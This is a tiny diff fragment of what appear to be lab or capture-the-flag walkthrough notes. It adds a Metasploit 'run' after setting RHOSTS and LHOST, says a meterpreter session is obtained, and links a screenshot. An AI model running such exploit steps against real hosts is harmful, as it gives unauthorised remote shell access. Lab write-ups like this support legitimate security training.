@@ -37,4 +37,10 @@ msf >set RHOSTS 10.201.89.202
 
 msf >set LHOST 10.17.17.19
 
-msf >
+msf >run
+
+Now we get the meterpreter session 
+
+![[Pasted image 20251025184353.png]]
+
+
